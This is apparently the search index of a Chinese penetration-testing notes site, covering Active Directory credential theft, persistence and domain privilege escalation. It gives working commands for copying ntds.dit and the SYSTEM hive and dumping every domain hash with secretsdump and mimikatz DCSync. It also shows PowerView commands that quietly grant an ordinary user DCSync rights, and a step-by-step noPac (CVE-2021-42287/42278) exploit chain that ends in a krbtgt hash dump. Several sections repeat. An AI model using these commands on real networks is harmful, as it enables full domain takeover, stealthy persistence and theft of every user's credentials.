IFM\u4e2d\u6587\u53eb\u5a92\u4f53\u5b89\u88c5\u96c6\uff0c\u5728\u6211\u4eec\u901a\u8fc7NTDSUTIL\u6765\u521b\u5efa\u5a92\u4f53\u5b89\u88c5\u96c6\u65f6\uff0c\u4f1a\u81ea\u52a8\u8fdb\u884c\u751f\u6210\u5feb\u7167\u3001\u52a0\u8f7d\u3001\u5c06ntds.dit\u3001\u8ba1\u7b97\u673a\u7684SAM\u548cSYSTEM\u6587\u4ef6\u590d\u5236\u5230\u76ee\u6807\u6587\u4ef6\u5939\u4e2d\u7b49\u64cd\u4f5c\uff0c\u9700\u7ba1\u7406\u5458\u6743\u9650\u3002 ntdsutil \"ac i ntds\" \"ifm\" \"create full c:/test\" q q \u7136\u540e\u5728C:\\test\\Active Directory\\ntds.dit\uff0c\u5c31\u662fNTDS.DIT\uff0c\u6211\u4eec\u590d\u5236\u51fa\u6765\u5c31\u884c\u4e86\u3002 \u7136\u540e\u518d\u628atest\u6587\u4ef6\u5939\u5220\u9664\u5373\u53ef\u3002","title":"Ntdsutil.exe"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#ntdsdit_1","text":"\u5728\u63d0\u53d6NTDS.DIT\u540e\uff0c\u6211\u4eec\u9700\u8981\u518d\u63d0\u53d6\u4e00\u4e2a\u6587\u4ef6system.hive\uff0c\u56e0\u4e3asystem.hive\u4e2d\u5b58\u653e\u7740NTDS.DIT\u7684\u5bc6\u94a5\uff0c\u6709\u4e86\u5b83\u6211\u4eec\u624d\u80fd\u89e3\u6790NTDS.DIT\u3002 \u53ef\u4ee5\u7528\u521a\u521a\u63d0\u5230\u7684VSS\u65b9\u6cd5\u83b7\u53d6\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u7528\u4ee5\u4e0b\u547d\u4ee4\u4ece\u6ce8\u518c\u8868\u4e2d\u62c9\u53d6. reg save hklm\\system c:\\system.hive","title":"\u89e3\u6790NTDS.DIT"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#impacket","text":"impacket\u6846\u67b6\u96c6\u6210\u4e86\u8bb8\u591a\u597d\u73a9\u7684\u4e1c\u897f\uff0c\u4ed6\u5176\u4e2d\u7684secretdump.py\u811a\u672c\u5b9e\u73b0\u4e86\u89e3\u6790ntds.dit\u7684\u529f\u80fd \u76f4\u63a5\u518dimpacket\u7684example\u4e0b python .\\secretsdump.py -system .\\system.hive -ntds .\\ntds.dit local","title":"Impacket"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_6","text":"","title":"\u8fdc\u7a0b\u89e3\u6790"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#dcsync","text":"\"DCSync\u662fMimikatz\u57282015\u5e74\u6dfb\u52a0\u7684\u4e00\u4e2a\u529f\u80fd\uff0c\u7531Benjamin DELPY gentilkiwi\u548cVincent LE TOUX\u5171\u540c\u7f16\u5199\uff0c\u5176\u80fd\u591f\u5229\u7528\u5377\u5f71\u62f7\u8d1d\u670d\u52a1\u76f4\u63a5\u8bfb\u53d6ndts.dit\u5e76\u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u7684\u54c8\u5e0c\u503c\u3002\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u3002\" \u8fd9\u4e2a\u4e1c\u897f \u53ef\u4ee5\u5b9e\u73b0\u4e0d\u767b\u5f55\u5230\u57df\u63a7\u800c\u83b7\u53d6\u57df\u63a7\u4e0a\u7684\u6570\u636e \u83b7\u5f97\u4ee5\u4e0b\u6743\u9650\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e86 Administrators\u7ec4\u5185\u7684\u7528\u6237 Domain Admins\u7ec4\u5185\u7684\u7528\u6237 Enterprise Admins\u7ec4\u5185\u7684\u7528\u6237 \u57df\u63a7\u5236\u5668\u7684\u8ba1\u7b97\u673a\u5e10\u6237 \u7136\u540e\u5728mimikatz\u91cc privilege::debug lsadump::dcsync /user:xxxx /domain:xxxxx /csv \u5373\u53ef \u60f3\u83b7\u53d6\u5168\u90e8hash\u4e5f\u53ef\u4ee5lsadump::dcsync /domain:xxx.com /all /csv \u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7krbtgt hash\u5236\u4f5c\u9ec4\u91d1\u7968\u636e\u767b\u5f55administrator\u3002 \u5982\u679c\u8fd8\u60f3\u9690\u853d\u4e00\u70b9\uff0c\u53ef\u4ee5\u7ed9\u666e\u901a\u7528\u6237\u6dfb\u52a0\u5982\u4e0bACE,\u4f7f\u5176\u83b7\u5f97dcsync\u6743\u9650 - - DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2) - DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2) - DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c) \u53ef\u4ee5\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u8fd0\u884cpowerview.ps1\u5b8c\u6210\u4ee5\u4e0a\u64cd\u4f5c #\u7ed9\u57df\u7528\u6237hack\u6dfb\u52a0\u4ee5\u4e0a\u4e09\u6761ACE Add-DomainObjectAcl -TargetIdentity \"DC=xie,DC=com\" -PrincipalIdentity hack -Rights DCSync -Verbose #\u7ed9\u57df\u7528\u6237hack\u5220\u9664\u4ee5\u4e0a\u4e09\u6761ACE Remove-DomainObjectAcl -TargetIdentity \"DC=xie,DC=com\" -PrincipalIdentity hack -Rights DCSync -Verbose \u7136\u540e\u666e\u901a\u7528\u6237\u4e5f\u53ef\u4ee5\u7528mimikatz\u8c03\u7528dcsync\u5bfc\u51fahash\u4e86","title":"DCSYNC"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#dcsyncpowershell","text":"mimikatz\u514d\u6740\u8fc7\u4e0d\u53bb\u7684\u8bdd\u53ef\u4ee5\u8bd5\u8bd5\u8fd9\u4e2a https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1 Import-Module .\\Invoke-DCSync.ps1 Invoke-DCSync -DumpForest | ft -wrap -autosize // \u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u7684hash Invoke-DCSync -DumpForest -Users @(\"administrator\") | ft -wrap -autosize // \u5bfc\u51fa\u57df\u5185administrator\u8d26\u6237\u7684hash \u6211\u8fd9\u91ccWIN10\u57df\u63a7\u6253\u4e0d\u901a\uff0c\u4e0d\u77e5\u9053\u4e3a\u5565","title":"DCSYNC\u7684powershell\u5b9e\u73b0"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#exchange","text":"exchange\u5b89\u88c5\u540e\u4f1a\u5728AD\u4e0a\u751f\u6210\u4e24\u4e2a\u5bb9\u5668 \u5176\u4e2dexchange windows permissions\u7ec4\u7684\u7528\u6237\u62e5\u6709writeDACL\u6743\u9650\uff0c Exchange Trusted Subsystem \u662f Exchange Windows Permission \u7684\u6210\u5458\uff0c\u80fd\u7ee7\u627fwritedacl\u6743\u9650\uff0c\u6709\u8fd9\u4e2a\u6743\u9650\u540e\u5c31\u80fd\u4f7f\u7528dcsync\u5bfc\u51fa\u6240\u6709\u7528\u6237hash\u3002 \u5176\u4e2dexchange trusted subsystem\u7ec4\u751a\u81f3\u53ef\u80fd\u6709\u7ee7\u627f\u81eaadministrators\u7ec4\u7684\u6743\u9650\u3002 \u540c\u65f6\uff0c\u5728\u5b89\u88c5exchange\u540e\u8fd8\u4f1a\u751f\u6210\u4e00\u4e2a\u7ec4Organization Management\uff0c\u8fd9\u4e2a\u7ec4\u53ef\u4ee5\u4fee\u6539\u5176\u4ed6exchange\u7ec4\u7684\u7528\u6237\u4fe1\u606f\u3002 \u5f53\u7136\u4e5f\u53ef\u4ee5\u4fee\u6539Exchange Trusted Subsystem\u7ec4\u7684\u6210\u5458\u4fe1\u606f\uff0c\u6bd4\u5982\u5411\u91cc\u9762\u52a0\u4e00\u4e2a\u4ee5\u83b7\u5f97\u7684\u7528\u6237\u3002 \u7efc\u4e0a\u6240\u8ff0\uff0c\u53ea\u8981\u83b7\u5f97Organization Management,Exchange Trusted Subsystem,Exchange Windows Permission,\u5c31\u53ef\u4ee5\u901a\u8fc7dcsync\u6765\u83b7\u53d6\u6574\u4e2a\u57df\u6743\u9650\u3002 \u5f53\u7136\uff0c\u60f3\u83b7\u5f97\u4e0a\u8ff0\u7ec4\u7528\u6237\u6743\u9650\uff0c\u8fd8\u662f\u4e0d\u592a\u5bb9\u6613\u7684\u3002","title":"\u914d\u5408EXCHANGE\u7528\u6237\u8fbe\u5230\u57df\u63d0\u6743\u76ee\u7684"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_7","text":"","title":"\u5229\u7528\u8bc1\u4e66\u6a21\u7248"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/","text":"\u57df\u7ba1\u63d0\u6743\u4e00\u628a\u68ad printnightmare\uff08CVE-2021-1675\uff09 CVE-2021-42287, CVE-2021-42278\u57df\u6743\u9650\u63d0\u5347 CVE-2022-26963AD\u57df\u6743\u9650\u63d0\u5347 ZeroLogon CVE-2020-1472","title":"\u57df\u7ba1\u63d0\u6743\u4e00\u628a\u68ad"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/#_1","text":"printnightmare\uff08CVE-2021-1675\uff09 CVE-2021-42287, CVE-2021-42278\u57df\u6743\u9650\u63d0\u5347 CVE-2022-26963AD\u57df\u6743\u9650\u63d0\u5347 ZeroLogon CVE-2020-1472","title":"\u57df\u7ba1\u63d0\u6743\u4e00\u628a\u68ad"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/CVE-2021-42287%2C%20CVE-2021-42278/CVE-2021-42287%2C%20CVE-2021-42278%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/","text":"CVE-2021-42287, CVE-2021-42278\u57df\u6743\u9650\u63d0\u5347 \u76ee\u5f55 nopac impacket \u8865\u4e01\uff1aKB5008602\u3001KB5008380 CVE-2021-42278\uff0c\u673a\u5668\u8d26\u6237\u7684\u540d\u79f0\u4e00\u822c\u7528 $ \u7ed3\u5c3e\uff0c\u4f46AD\u5e76\u672a\u5bf9\u57df\u5185\u673a\u5668\u8d26\u6237\u540d\u8fdb\u884c\u9a8c\u8bc1\u3002 CVE-2021-42287\uff0c \u7ed3\u5408\u4e0a\u8ff042278\u6f0f\u6d1e\uff0c\u521b\u5efa\u4e00\u4e2a\u4e0eDC\u673a\u5668\u8d26\u6237\u540d\u79f0\u76f8\u540c\u7684\u673a\u5668\u8d26\u6237(\u4e0d\u4ee5\\$\u7ed3\u5c3e)\uff0c\u4f7f\u7528\u8be5\u8d26\u6237\u8bf7\u6c42\u4e00\u4e2aTGT\u540e\uff0c\u4fee\u6539\u8d26\u6237\u540d\uff0c\u7136\u540e\u901a\u8fc7S4U2Self\u7533\u8bf7TGS Ticket\uff0c\u7136\u540eDC\u8fdb\u884c\u5728 TGS_REP \u9636\u6bb5\u52a0\u5bc6 TGS Ticket \u65f6\uff0c\u65e0\u6cd5\u627e\u5230\u8be5\u8d26\u6237\u5229\u7528\u673a\u5668\u8d26\u6237hash\u52a0\u5bc6\uff0cDC\u4fbf\u4f7f\u7528\u81ea\u5df1\u7684hash\u52a0\u5bc6 TGS Ticket \uff0c\u63d0\u4f9b\u4e00\u4e2a\u5c5e\u4e8e\u8be5\u8d26\u6237\u7684 PAC \uff0c\u6211\u4eec\u4fbf\u53ef\u5f97\u5230\u4e00\u4e2a\u9ad8\u6743\u9650\u7684ST\u3002 \u81f3\u4e8e\u4e3a\u4ec0\u4e48\u8981\u901a\u8fc7s4u2self\u8bf7\u6c42TGS\uff0c\u6211\u4e5f\u4e0d\u662f\u5f88\u61c2\u3002\u4e0d\u8fc7\u5f53\u4e00\u4e2a\u811a\u672c\u5c0f\u5b50\u5c31\u884c \u9996\u5148\u521b\u5efa\u4e00\u4e2a\u673a\u5668\u8d26\u6237 \u6e05\u9664\u673a\u5668\u8d26\u6237\u7684 servicePrincipalName \u5c5e\u6027 \u5c06\u673a\u5668\u8d26\u6237\u7684 sAMAccountName \u4fee\u6539\u4e3aDC\u7684\u673a\u5668\u8d26\u6237\u540d\uff0c\u4f46\u4e0d\u5e26\\$ \u4f7f\u7528\u673a\u5668\u8d26\u6237\u7684\u8eab\u4efd\u8bf7\u6c42TGT \u5c06\u673a\u5668\u8d26\u6237\u7684 sAMAccountName \u4fee\u6539\u4e3a\u5176\u4ed6\u503c\uff0c\u4e0d\u80fd\u4e0eDC\u7684\u673a\u5668\u8d26\u6237\u540d\u91cd\u590d\u3002 \u901a\u8fc7S4U2Self\u5411KDC\u7533\u8bf7ST \u62ff\u5230\u9ad8\u6743\u9650ST\u7968\u636e\uff0c\u5b8c\u6210\u5229\u7528\u3002 nopac \u81ea\u52a8\u5316\u6b66\u5668\u94fe\u63a5\uff1a https://github.com/cube0x0/noPac \u626b\u63cf//\u57df\u8d26\u6237noPac.exe scan -domain good.test -user testuser -pass 123456aa.. \u5bfc\u5165\u7968\u636e \u53ef\u4ee5\u628acifs\u534f\u8bae\u6539\u6210ldap\uff08cifs\u65f6\u95f4\u8fc7\u957f\u4f1a\u5bfc\u81f4\u7968\u636e\u5931\u6548\uff09 /mAccount \u968f\u4fbf\u586b/mPassword \u968f\u4fbf\u586b noPac.exe -domain good.test -user testuser -pass 123456aa.. /dc DC.good.test /mAccount dadd /mPassword sdadasdsa /service cifs /ptt \u62ffshell\u53ef\u4ee5\u7528psexec PsExec.exe dc.hacker.test cmd.exe impacket https://github.com/dirkjanm/krbrelayx \u83b7\u5f97addspn.py renamemachine.py \u5728\u6b64\u5206\u652f\u83b7\u5f97 https://github.com/fortra/impacket/blob/0c74df065eeffde8c24edb56e880ab49c82530b7/examples/renameMachine.py # 0. create a computer account addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword' # 1. clear its SPNs addspn.py -u 'domain\\user' -p 'password' -t 'ControlledComputer$' -c DomainController # 2. rename the computer (computer -> DC) renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password' # 3. obtain a TGT getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword' # 4. reset the computer name renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password' # 5. obtain a service ticket with S4U2self by presenting the previous TGT DomainController.ccache\u6765\u81ea\u7b2c\u4e09\u6b65tgt\u4fdd\u5b58\u7684\u6587\u4ef6 KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController' # 6. DCSync by presenting the service ticket KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'","title":"CVE-2021-42287, CVE-2021-42278\u57df\u6743\u9650\u63d0\u5347"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/CVE-2021-42287%2C%20CVE-2021-42278/CVE-2021-42287%2C%20CVE-2021-42278%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/#cve-2021-42287-cve-2021-42278","text":"","title":"CVE-2021-42287, CVE-2021-42278\u57df\u6743\u9650\u63d0\u5347"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/CVE-2021-42287%2C%20CVE-2021-42278/CVE-2021-42287%2C%20CVE-2021-42278%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/#_1","text":"nopac impacket \u8865\u4e01\uff1aKB5008602\u3001KB5008380 CVE-2021-42278\uff0c\u673a\u5668\u8d26\u6237\u7684\u540d\u79f0\u4e00\u822c\u7528 $ \u7ed3\u5c3e\uff0c\u4f46AD\u5e76\u672a\u5bf9\u57df\u5185\u673a\u5668\u8d26\u6237\u540d\u8fdb\u884c\u9a8c\u8bc1\u3002 CVE-2021-42287\uff0c \u7ed3\u5408\u4e0a\u8ff042278\u6f0f\u6d1e\uff0c\u521b\u5efa\u4e00\u4e2a\u4e0eDC\u673a\u5668\u8d26\u6237\u540d\u79f0\u76f8\u540c\u7684\u673a\u5668\u8d26\u6237(\u4e0d\u4ee5\\$\u7ed3\u5c3e)\uff0c\u4f7f\u7528\u8be5\u8d26\u6237\u8bf7\u6c42\u4e00\u4e2aTGT\u540e\uff0c\u4fee\u6539\u8d26\u6237\u540d\uff0c\u7136\u540e\u901a\u8fc7S4U2Self\u7533\u8bf7TGS Ticket\uff0c\u7136\u540eDC\u8fdb\u884c\u5728 TGS_REP \u9636\u6bb5\u52a0\u5bc6 TGS Ticket \u65f6\uff0c\u65e0\u6cd5\u627e\u5230\u8be5\u8d26\u6237\u5229\u7528\u673a\u5668\u8d26\u6237hash\u52a0\u5bc6\uff0cDC\u4fbf\u4f7f\u7528\u81ea\u5df1\u7684hash\u52a0\u5bc6 TGS Ticket \uff0c\u63d0\u4f9b\u4e00\u4e2a\u5c5e\u4e8e\u8be5\u8d26\u6237\u7684 PAC \uff0c\u6211\u4eec\u4fbf\u53ef\u5f97\u5230\u4e00\u4e2a\u9ad8\u6743\u9650\u7684ST\u3002 \u81f3\u4e8e\u4e3a\u4ec0\u4e48\u8981\u901a\u8fc7s4u2self\u8bf7\u6c42TGS\uff0c\u6211\u4e5f\u4e0d\u662f\u5f88\u61c2\u3002\u4e0d\u8fc7\u5f53\u4e00\u4e2a\u811a\u672c\u5c0f\u5b50\u5c31\u884c \u9996\u5148\u521b\u5efa\u4e00\u4e2a\u673a\u5668\u8d26\u6237 \u6e05\u9664\u673a\u5668\u8d26\u6237\u7684 servicePrincipalName \u5c5e\u6027 \u5c06\u673a\u5668\u8d26\u6237\u7684 sAMAccountName \u4fee\u6539\u4e3aDC\u7684\u673a\u5668\u8d26\u6237\u540d\uff0c\u4f46\u4e0d\u5e26\\$ \u4f7f\u7528\u673a\u5668\u8d26\u6237\u7684\u8eab\u4efd\u8bf7\u6c42TGT \u5c06\u673a\u5668\u8d26\u6237\u7684 sAMAccountName \u4fee\u6539\u4e3a\u5176\u4ed6\u503c\uff0c\u4e0d\u80fd\u4e0eDC\u7684\u673a\u5668\u8d26\u6237\u540d\u91cd\u590d\u3002 \u901a\u8fc7S4U2Self\u5411KDC\u7533\u8bf7ST \u62ff\u5230\u9ad8\u6743\u9650ST\u7968\u636e\uff0c\u5b8c\u6210\u5229\u7528\u3002","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/CVE-2021-42287%2C%20CVE-2021-42278/CVE-2021-42287%2C%20CVE-2021-42278%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/#nopac","text":"\u81ea\u52a8\u5316\u6b66\u5668\u94fe\u63a5\uff1a https://github.com/cube0x0/noPac \u626b\u63cf//\u57df\u8d26\u6237noPac.exe scan -domain good.test -user testuser -pass 123456aa.. \u5bfc\u5165\u7968\u636e \u53ef\u4ee5\u628acifs\u534f\u8bae\u6539\u6210ldap\uff08cifs\u65f6\u95f4\u8fc7\u957f\u4f1a\u5bfc\u81f4\u7968\u636e\u5931\u6548\uff09 /mAccount \u968f\u4fbf\u586b/mPassword \u968f\u4fbf\u586b noPac.exe -domain good.test -user testuser -pass 123456aa.. /dc DC.good.test /mAccount dadd /mPassword sdadasdsa /service cifs /ptt \u62ffshell\u53ef\u4ee5\u7528psexec PsExec.exe dc.hacker.test cmd.exe","title":"nopac"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/CVE-2021-42287%2C%20CVE-2021-42278/CVE-2021-42287%2C%20CVE-2021-42278%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/#impacket","text":"https://github.com/dirkjanm/krbrelayx \u83b7\u5f97addspn.py renamemachine.py \u5728\u6b64\u5206\u652f\u83b7\u5f97 https://github.com/fortra/impacket/blob/0c74df065eeffde8c24edb56e880ab49c82530b7/examples/renameMachine.py # 0. create a computer account addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword' # 1. clear its SPNs addspn.py -u 'domain\\user' -p 'password' -t 'ControlledComputer$' -c DomainController # 2. rename the computer (computer -> DC) renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password' # 3. obtain a TGT getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword' # 4. reset the computer name renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password' # 5. obtain a service ticket with S4U2self by presenting the previous TGT DomainController.ccache\u6765\u81ea\u7b2c\u4e09\u6b65tgt\u4fdd\u5b58\u7684\u6587\u4ef6 KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController' # 6. DCSync by presenting the service ticket KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'","title":"impacket"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/CVE-2022-26963AD%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/CVE-2022-26963AD%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/","text":"CVE-2022-26963AD\u57df\u6743\u9650\u63d0\u5347 \u76ee\u5f55 \u653b\u51fb \u53d7\u5f71\u54cd\u7684 Windows \u7248\u672c\uff1a Windows 8.1 Windows 10 Version 1607, 1809,1909, 2004, 20H2, 21H1, 21H2 Windows 11 Windows Server 2008\uff0c2012\uff0c2016\uff0c2019\uff0c2022 \u7531\u4e8e\u8ba1\u7b97\u673a\u8d26\u6237\u4e2d\u7684dNSHostName\u4e0d\u5177\u6709\u552f\u4e00\u6027\uff0c\u53ef\u4ee5\u5bf9\u5176\u8fdb\u884c\u4f2a\u9020\uff0c\u5192\u5145\u9ad8\u6743\u9650\u7684\u57df\u7a7a\u673a\u5668\u8d26\u6237\uff0c\u5b9e\u73b0\u6743\u9650\u63d0\u5347\u7684\u6548\u679c \u6f0f\u6d1e\u5229\u7528\u6761\u4ef6\uff1a \u80fd\u591f\u521b\u5efa\u673a\u5668\u8d26\u6237\uff08\u6216\u62e5\u6709\u67d0\u673a\u5668\u8d26\u6237\u7684\u63a7\u5236\u6743\uff09 \u5bf9\u673a\u5668\u8d26\u6237\u5177\u6709\u4fee\u6539\u5c5e\u6027\u7684\u6743\u9650 \u76ee\u6807\u672a\u6253\u76f8\u5e94\u8865\u4e01 \u653b\u51fb https://github.com/ly4k/Certipy 